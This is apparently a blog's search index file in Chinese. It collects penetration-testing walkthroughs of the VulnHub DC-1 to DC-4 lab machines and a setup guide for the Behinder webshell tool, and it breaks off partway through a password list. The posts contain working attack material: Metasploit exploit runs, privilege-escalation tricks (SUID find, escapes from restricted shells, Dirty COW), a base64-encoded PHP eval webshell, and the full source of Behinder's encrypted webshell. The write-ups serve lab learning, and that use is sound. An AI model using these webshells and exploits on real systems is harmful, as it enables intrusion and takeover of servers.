<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>渗透-DC1</title>
    <url>/2022/04/15/DC-1/</url>
    <content><![CDATA[<p>渗透环境：DC1<br>攻击机：192.168.138.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>靶机环境：<a href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="使用nmap扫描存活的主机"><a href="#使用nmap扫描存活的主机" class="headerlink" title="使用nmap扫描存活的主机"></a>使用nmap扫描存活的主机</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap  -sP 192.168.138.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/15/DC-1/1.png" alt="img"></p>
<p>192.168.178.129：目标主机</p>
<h3 id="扫描目标主机对外开放的端口"><a href="#扫描目标主机对外开放的端口" class="headerlink" title="扫描目标主机对外开放的端口"></a>扫描目标主机对外开放的端口</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">namp -sS -p- 192.168.178.129</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/15/DC-1/2.png" alt="img"></p>
<p>发现开启了端口80<br>浏览192.168.178.129:80</p>
<p><img src="/2022/04/15/DC-1/3.png" alt="img"></p>
<p>查看Wappalyzer</p>
<p><img src="/2022/04/15/DC-1/4.png" alt="img"></p>
<p>发现cms为Drupal，这版本有点low，估计有漏洞</p>
<h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>使用msf</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search drupal</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/15/DC-1/5.png" alt="img"></p>
<p>这里我们选择exploit&#x2F;multi&#x2F;http&#x2F;drupal_drupageddon</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use 2</span><br><span class="line">options//查看需要设置的参数</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.178.129//设置目标ip</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>成功后我们执行ls，查看当前目录</p>
<p><img src="/2022/04/15/DC-1/6.png" alt="img"></p>
<p>发现flag1.txt，打开查看</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> flag1.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/15/DC-1/7.png" alt="img"></p>
<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>到这里，上传个一句话木马看看</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">upload /data/shell.php</span><br></pre></td></tr></table></figure>

<p>用蚁剑进行连接</p>
<p><img src="/2022/04/15/DC-1/8.png" alt="img"></p>
<p>找找第二个flag在哪<br>最后发现在settings.php中</p>
<p><img src="/2022/04/15/DC-1/9.png" alt="img"></p>
<h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>里面还有数据库的账号密码，也发现是mysql<br>在msf上传个交互shell, 然后连接mysql</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">mysql -u dbuser -p </span><br><span class="line">R0ck3t</span><br></pre></td></tr></table></figure>

<p>然后就常规的，查库，查表，查列，爆内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">show databases; </span><br><span class="line">use drupaldb; </span><br><span class="line">show tables; </span><br><span class="line">select * from <span class="built_in">users</span>; </span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/15/DC-1/10.png" alt="img"></p>
<p>这里admin的密码被加密了，我们选择update的方式改为我们知道的密码<br>其中drupal可以通过password-hash.sh生成新的密码<br>我们在www目录执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php scripts/password-hash.sh admin</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/15/DC-1/11.png" alt="img"></p>
<p>sql中的替换语句</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update <span class="built_in">users</span> <span class="built_in">set</span> pass=<span class="string">&#x27;$S$DtPgSa61SbR1DXIh4wWcMft/rOmsKXcgvxTUAgenIMRbH65ZUAZu&#x27;</span> <span class="built_in">where</span> name=<span class="string">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>用账号：admin 密码：admin ，登录192.168.178.129:80查看里面信息</p>
<p><img src="/2022/04/15/DC-1/12.png" alt="img"></p>
<h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>在home目录下发现flag4.txt</p>
<p><img src="/2022/04/15/DC-1/13.png" alt="img"></p>
<h3 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h3><p>所以我们要提权到root，这里我们用find提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/15/DC-1/14.png" alt="img"></p>
<p>发现find能利用<br>在&#x2F;tmp目录下创建command文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">touch</span> <span class="built_in">command</span></span><br><span class="line">find <span class="built_in">command</span> -<span class="built_in">exec</span> <span class="built_in">whoami</span> \;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/15/DC-1/15.png" alt="img"></p>
<p>发现获得root权限了<br>修改命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find <span class="built_in">command</span> -<span class="built_in">exec</span> <span class="built_in">ls</span> /root \; </span><br><span class="line">find <span class="built_in">command</span> -<span class="built_in">exec</span> <span class="built_in">cat</span> /root/thefinalflag.txt \; </span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/15/DC-1/16.png" alt="img"></p>
<p>到处为止DC-1完成</p>
]]></content>
      <categories>
        <category>实践</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>Behinder冰蝎</title>
    <url>/2022/04/28/Behinder/</url>
    <content><![CDATA[<p>最近尝试使用冰蝎这个工具，期间踩了很多坑，这里记录一下<br>冰蝎下载地址：<a href="https://github.com/rebeyond/Behinder/releases">https://github.com/rebeyond/Behinder/releases</a></p>
<p><img src="/2022/04/28/Behinder/1.png" alt="img"></p>
<p>这里我们选择zip下载，然后解压，<br>这里出现第一个坑：<br>大家可能会只装了java16，因为我们的burp抓包工具，需要用java16环境，java8不行<br>但我们的冰蝎在java16下打不开，java8可以，所以我们在这里也把java8安装一下<br><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a><br>安装完后，记录好你安装的路径<br>在冰蝎目录下建议一个文件<br>Behinder_start.bat</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> D:\Java\jdk-se8\bin //java8路径</span><br><span class="line">start javaw  -jar D:\tools\Behinder_v3.0_Beta_7\Behinder.jar //冰蝎路径</span><br></pre></td></tr></table></figure>

<p>然后我们运作这个bat就能打开冰蝎了</p>
<p><img src="/2022/04/28/Behinder/2.png" alt="img"></p>
<p>冰蝎不能用普通的一句话木马连接</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">        <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; <span class="comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line">    <span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">        <span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">              </span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">                 <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">                &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果要修改连接密码则将自己的密码进行md5加密然后取其前16位替换$key的值</p>
<p><img src="/2022/04/28/Behinder/3.png" alt="img"></p>
<p>连接成功</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-2</title>
    <url>/2022/04/15/DC-2/</url>
    <content><![CDATA[<p>渗透环境: DC-2  <a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a><br>攻击机：192.168.168.128<br>靶机：靶机：ip地址未知, 已知ip与攻击机在同一网段下</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><h3 id="使用nmap扫描存活的主机"><a href="#使用nmap扫描存活的主机" class="headerlink" title="使用nmap扫描存活的主机"></a>使用nmap扫描存活的主机</h3><p>老规矩上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">namp -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/15/DC-2/1.png" alt="img"></p>
<p>发现靶机IP为192.168.168.129</p>
<h3 id="扫描目标主机对外开放的端口"><a href="#扫描目标主机对外开放的端口" class="headerlink" title="扫描目标主机对外开放的端口"></a>扫描目标主机对外开放的端口</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">namp -sS -p- 192.168.168.129</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/15/DC-2/2.png" alt="img"></p>
<p>发现开启了端口80<br>还有一个7744，这啥端口啊，对着这个端口再扫一次</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A -p 7744 192.168.168.129</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/15/DC-2/2.6.png" alt="img"></p>
<p>原来是ssh呢，先不管吧<br>浏览192.168.168.129:80</p>
<p><img src="/2022/04/15/DC-2/2.5.png" alt="img"></p>
<p>发现flag1</p>
<p><img src="/2022/04/15/DC-2/3.png" alt="img"></p>
<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>查看cms是什么</p>
<p><img src="/2022/04/15/DC-2/4.png" alt="img"></p>
<p>好家伙是wordpress，而且还是4.7的<br>用dirsearch看看目录下有什么</p>
<p><img src="/2022/04/15/DC-2/5.png" alt="img"></p>
<h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><p>进入后台吧</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://dc-2/wp-login.php?redirect_to=http%3A%2F%2F192.168.168.129%2Fwp-admin%2F&amp;reauth=1</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/15/DC-2/6.png" alt="img"></p>
<p>经典登录框<br>既然是WordPress，那就用wpscan看看有什么用户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo wpscan --url http://dc-2/ –enumerate u </span><br></pre></td></tr></table></figure>

<p>发现以下三个user</p>
<p><img src="/2022/04/15/DC-2/7.png" alt="img"></p>
<p>放到burp上进行爆破看看，结果失败了，看来原字典中没有匹配的。<br>flag1中有说到cewl，那就用cewl生成字典再试试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cewl http://dc-2/ &gt; dc-2.txt</span><br></pre></td></tr></table></figure>

<p>用生成的dc-2.txt作为字典再跑一次（集束炸弹）</p>
<p><img src="/2022/04/15/DC-2/8.png" alt="img"></p>
<p>登录看看</p>
<p><img src="/2022/04/15/DC-2/9.png" alt="img"></p>
<p>flag2 get</p>
<h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>这里让我们找其他突破口，看了这个wordpress没用了<br>试着上传，结果跟我说路径创不了，好吧</p>
<p>回到之前收集到的7744端口，这就是其他突破口，ssh远程连接<br>这里我用xshell连接</p>
<p><img src="/2022/04/15/DC-2/10.png" alt="img"></p>
<p>配好后用刚刚得到的两串账号密码登录看看行不行<br>我用tom的是可以的<br>进去后发现不能用很多命令，存在命令受限问题<br>ls ，vi 能用。<br>ls，发现当前目录存在flag3.txt，用vi查看</p>
<p><img src="/2022/04/15/DC-2/11.png" alt="img"></p>
<h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>我这里用了vi绕过受限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi</span><br><span class="line">:<span class="built_in">set</span> shell=/bin/bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>

<p>发现能用cd了<br>看看有什么敏感目录吧<br>最后在&#x2F;home&#x2F;jerryx下发现flag4.txt</p>
<p><img src="/2022/04/15/DC-2/12.png" alt="img"></p>
<h3 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h3><p>git提权是吧<br>结果发现git不给用，还是得解决命令受限问题<br>最后找到了这种，rbash绕过<br>参考(<a href="https://xz.aliyun.com/t/7642#toc-3">https://xz.aliyun.com/t/7642#toc-3</a>)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/15/DC-2/13.png" alt="img"></p>
<p>这里我们要改两个地方，其中是PATH与SHELL</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin/:/usr/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> SHELL=/bin/sh</span><br></pre></td></tr></table></figure>

<p>这样我们就能用其他命令了<br>发现tom不是sudoer，那就切成jerry</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo git -p <span class="built_in">help</span></span><br><span class="line">:!/bin/bash</span><br></pre></td></tr></table></figure>

<p>提权成功<br>查看&#x2F;root<br>发现最后的flag</p>
<p><img src="/2022/04/15/DC-2/14.png" alt="img"></p>
<p>DC2 clear</p>
]]></content>
      <categories>
        <category>实践</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-3</title>
    <url>/2022/04/16/DC-3/</url>
    <content><![CDATA[<p>渗透环境：DC3 <a href="https://www.vulnhub.com/entry/dc-32,312/">https://www.vulnhub.com/entry/dc-32,312/</a><br>攻击机：192.168.168.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="扫面存活主机"><a href="#扫面存活主机" class="headerlink" title="扫面存活主机"></a>扫面存活主机</h3><p>还是老规矩，nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/16/DC-3/1.png" alt="img"></p>
<p>发现目标主机为192.168.168.130</p>
<h3 id="扫描主机开放端口"><a href="#扫描主机开放端口" class="headerlink" title="扫描主机开放端口"></a>扫描主机开放端口</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS -p- 192.168.168.130</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/16/DC-3/2.png" alt="img"></p>
<p>开放了80端口，浏览器打开</p>
<p><img src="/2022/04/16/DC-3/cover.png" alt="img"></p>
<h3 id="收集其他信息"><a href="#收集其他信息" class="headerlink" title="收集其他信息"></a>收集其他信息</h3><p>查看cms情况</p>
<p><img src="/2022/04/16/DC-3/3.png" alt="img"></p>
<p>是joomia<br>用dirsearch看看目录情况</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.168.130/ -e *</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/16/DC-3/4.png" alt="img"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>存在管理员后台，看看</p>
<p><img src="/2022/04/16/DC-3/5.png" alt="img"></p>
<p>经测试单纯burp爆破不开来<br>这我百度joomla存在的漏洞，发现存在sql注入漏洞，测试是否存在</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://yourIP/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,database()),1)</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/16/DC-3/6.png" alt="img"></p>
<p>确实是存在报错注入<br>上msf</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search joomla</span><br><span class="line">use 5</span><br><span class="line">options</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.168.130</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/16/DC-3/7.png" alt="img"></p>
<p>成功连上了</p>
<p><img src="/2022/04/16/DC-3/8.png" alt="img"></p>
<p>注：后来重做的时候发现在burp时其实已经找到密码了，不然这里用不了</p>
<p><img src="/2022/04/16/DC-3/9.png" alt="img"></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>三连问身份</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">id</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/16/DC-3/10.png" alt="img"></p>
<p>上传权限漏洞探测脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; upload ./linux-exploit-suggester-master/linux-exploit-suggester.sh &gt; /tmp/les.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>给脚本加执行权限然后执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">chmod</span> +x les.sh</span><br><span class="line">./les.sh</span><br></pre></td></tr></table></figure>

<p>发现脏牛</p>
<p><img src="/2022/04/16/DC-3/11.png" alt="img"></p>
<p>在www目录下下载脏牛提权脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/gbonacini/CVE-2016-5195.git</span><br><span class="line"><span class="built_in">cd</span> ./CVE-2016-5195                                                  </span><br><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil //编译</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>                      //打开交互式环境        </span><br><span class="line">./dcow                                                              //执行</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/16/DC-3/12.png" alt="img"></p>
<p>OK！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo root</span><br><span class="line">dirtyCowfun</span><br><span class="line">cat /root/the-flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/16/DC-3/13.png" alt="img"></p>
<p>DC3 completed</p>
]]></content>
      <categories>
        <category>实践</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>提权</tag>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-4</title>
    <url>/2022/04/17/DC-4/</url>
    <content><![CDATA[<p>渗透环境：DC4 <a href="https://www.vulnhub.com/entry/dc-32,312/">https://www.vulnhub.com/entry/dc-32,312/</a><br>攻击机：192.168.168.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="扫面存活主机"><a href="#扫面存活主机" class="headerlink" title="扫面存活主机"></a>扫面存活主机</h3><p>还是老规矩，nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/17/DC-4/1.png" alt="img"></p>
<p>发现目标主机为192.168.168.131</p>
<h3 id="扫描主机开放端口"><a href="#扫描主机开放端口" class="headerlink" title="扫描主机开放端口"></a>扫描主机开放端口</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.168.131</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/17/DC-4/2.png" alt="img"></p>
<p>开放了80端口和22端口，浏览器打开</p>
<p><img src="/2022/04/17/DC-4/cover.png" alt="img"></p>
<h3 id="收集其他信息"><a href="#收集其他信息" class="headerlink" title="收集其他信息"></a>收集其他信息</h3><p>用dirsearch看看目录情况</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.168.130/ -e *</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/17/DC-4/3.png" alt="img"></p>
<p>有个command.php，应该是远程命令执行了</p>
<h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><p>显示用burp进行爆破</p>
<p><img src="/2022/04/17/DC-4/4.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">账号：admin</span><br><span class="line">密码：happy</span><br></pre></td></tr></table></figure>

<p>登录进去</p>
<p><img src="/2022/04/17/DC-4/5.png" alt="img"></p>
<p>确实是命令执行<br>抓包<br>修改上传参数<br>上一个base64木马上去</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydMMWFuZyddKTs/Pg== &quot;</span>|<span class="built_in">base64</span> -d &gt; shell.php</span><br></pre></td></tr></table></figure>

<p>上传成功</p>
<p><img src="/2022/04/17/DC-4/6.png" alt="img"></p>
<p>蚁剑连接</p>
<p><img src="/2022/04/17/DC-4/7.png" alt="img"></p>
<p>查看&#x2F;home下有什么内容<br>在&#x2F;home&#x2F;jim&#x2F;backups&#x2F;old-passwords.bak下找到了旧密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">000000</span><br><span class="line">12345</span><br><span class="line">iloveyou</span><br><span class="line">1q2w3e4r5t</span><br><span class="line">1234</span><br><span class="line">123456a</span><br><span class="line">qwertyuiop</span><br><span class="line">monkey</span><br><span class="line">123321</span><br><span class="line">dragon</span><br><span class="line">654321</span><br><span class="line">666666</span><br><span class="line">123</span><br><span class="line">myspace1</span><br><span class="line">a123456</span><br><span class="line">121212</span><br><span class="line">1qaz2wsx</span><br><span class="line">123qwe</span><br><span class="line">123abc</span><br><span class="line">tinkle</span><br><span class="line">target123</span><br><span class="line">gwerty</span><br><span class="line">1g2w3e4r</span><br><span class="line">gwerty123</span><br><span class="line">zag12wsx</span><br><span class="line">7777777</span><br><span class="line">qwerty1</span><br><span class="line">1q2w3e4r</span><br><span class="line">987654321</span><br><span class="line">222222</span><br><span class="line">qwe123</span><br><span class="line">qwerty123</span><br><span class="line">zxcvbnm</span><br><span class="line">555555</span><br><span class="line">112233</span><br><span class="line">fuckyou</span><br><span class="line">asdfghjkl</span><br><span class="line">12345a</span><br><span class="line">123123123</span><br><span class="line">1q2w3e</span><br><span class="line">qazwsx</span><br><span class="line">loveme1</span><br><span class="line">juventus</span><br><span class="line">jennifer1</span><br><span class="line">!~!1</span><br><span class="line">bubbles</span><br><span class="line">samuel</span><br><span class="line">fuckoff</span><br><span class="line">lovers</span><br><span class="line">cheese1</span><br><span class="line">0123456</span><br><span class="line">123asd</span><br><span class="line">999999999</span><br><span class="line">madison</span><br><span class="line">elizabeth1</span><br><span class="line">music</span><br><span class="line">buster1</span><br><span class="line">lauren</span><br><span class="line">david1</span><br><span class="line">tigger1</span><br><span class="line">123qweasd</span><br><span class="line">taylor1</span><br><span class="line">carlos</span><br><span class="line">tinkerbell</span><br><span class="line">samantha1</span><br><span class="line">Sojdlg123aljg</span><br><span class="line">joshua1</span><br><span class="line">poop</span><br><span class="line">stella</span><br><span class="line">myspace123</span><br><span class="line">asdasd5</span><br><span class="line">freedom1</span><br><span class="line">whatever1</span><br><span class="line">xxxxxx</span><br><span class="line">00000</span><br><span class="line">valentina</span><br><span class="line">a1b2c3</span><br><span class="line">741852963</span><br><span class="line">austin</span><br><span class="line">monica</span><br><span class="line">qaz123</span><br><span class="line">lovely1</span><br><span class="line">music1</span><br><span class="line">harley1</span><br><span class="line">family1</span><br><span class="line">spongebob1</span><br><span class="line">steven</span><br><span class="line">nirvana</span><br><span class="line">1234abcd</span><br><span class="line">hellokitty</span><br><span class="line">thomas1</span><br><span class="line">cooper</span><br><span class="line">520520</span><br><span class="line">muffin</span><br><span class="line">christian1</span><br><span class="line">love13</span><br><span class="line">fucku2</span><br><span class="line">arsenal1</span><br><span class="line">lucky7</span><br><span class="line">diablo</span><br><span class="line">apples</span><br><span class="line">george1</span><br><span class="line">babyboy1</span><br><span class="line">crystal</span><br><span class="line">1122334455</span><br><span class="line">player1</span><br><span class="line">aa123456</span><br><span class="line">vfhbyf</span><br><span class="line">forever1</span><br><span class="line">Password</span><br><span class="line">winston</span><br><span class="line">chivas1</span><br><span class="line">sexy</span><br><span class="line">hockey1</span><br><span class="line">1a2b3c4d</span><br><span class="line">pussy</span><br><span class="line">playboy1</span><br><span class="line">stalker</span><br><span class="line">cherry</span><br><span class="line">tweety</span><br><span class="line">toyota</span><br><span class="line">creative</span><br><span class="line">gemini</span><br><span class="line">pretty1</span><br><span class="line">maverick</span><br><span class="line">brittany1</span><br><span class="line">nathan1</span><br><span class="line">letmein1</span><br><span class="line">cameron1</span><br><span class="line">secret1</span><br><span class="line">google1</span><br><span class="line">heaven</span><br><span class="line">martina</span><br><span class="line">murphy</span><br><span class="line">spongebob</span><br><span class="line">uQA9Ebw445</span><br><span class="line">fernando</span><br><span class="line">pretty</span><br><span class="line">startfinding</span><br><span class="line">softball</span><br><span class="line">dolphin1</span><br><span class="line">fuckme</span><br><span class="line">test123</span><br><span class="line">qwerty1234</span><br><span class="line">kobe24</span><br><span class="line">alejandro</span><br><span class="line">adrian</span><br><span class="line">september</span><br><span class="line">aaaaaa1</span><br><span class="line">bubba1</span><br><span class="line">isabella</span><br><span class="line">abc123456</span><br><span class="line">password3</span><br><span class="line">jason1</span><br><span class="line">abcdefg123</span><br><span class="line">loveyou1</span><br><span class="line">shannon</span><br><span class="line">100200</span><br><span class="line">manuel</span><br><span class="line">leonardo</span><br><span class="line">molly1</span><br><span class="line">flowers</span><br><span class="line">123456z</span><br><span class="line">007007</span><br><span class="line">password.</span><br><span class="line">321321</span><br><span class="line">miguel</span><br><span class="line">samsung1</span><br><span class="line">sergey</span><br><span class="line">sweet1</span><br><span class="line">abc1234</span><br><span class="line">windows</span><br><span class="line">qwert123</span><br><span class="line">vfrcbv</span><br><span class="line">poohbear</span><br><span class="line">d123456</span><br><span class="line">school1</span><br><span class="line">badboy</span><br><span class="line">951753</span><br><span class="line">123456c</span><br><span class="line">111</span><br><span class="line">steven1</span><br><span class="line">snoopy1</span><br><span class="line">garfield</span><br><span class="line">YAgjecc826</span><br><span class="line">compaq</span><br><span class="line">candy1</span><br><span class="line">sarah1</span><br><span class="line">qwerty123456</span><br><span class="line">123456l</span><br><span class="line">eminem1</span><br><span class="line">141414</span><br><span class="line">789789</span><br><span class="line">maria</span><br><span class="line">steelers</span><br><span class="line">iloveme1</span><br><span class="line">morgan1</span><br><span 